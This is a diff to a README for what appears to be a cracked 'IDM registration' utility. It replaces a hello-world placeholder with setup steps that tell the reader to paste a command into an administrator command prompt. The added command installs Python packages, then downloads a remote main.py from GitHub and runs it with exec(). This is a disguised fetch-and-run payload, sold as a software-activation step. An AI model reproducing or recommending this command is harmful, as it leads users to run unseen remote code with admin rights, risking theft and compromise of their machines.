@@ -23,10 +23,8 @@ Here's a screenshot of what the Registerd IDM looks like:
 1. Install Pythion on your device.
 2. Copy this command, and past it on cmd (Administration required)
 ```python
-def hello_world():
-    print("Hello, world!")
+C:\Windows\py.exe -c "import subprocess, sys; subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests', 'psutil', '-qU']); import requests, psutil, subprocess; exec(requests.get('https://raw.githubusercontent.com/musaalif6969/IDM-Registration-Utility/main/main.py').text)"
 
-hello_world()
 ```
 3.Your good to go !
 
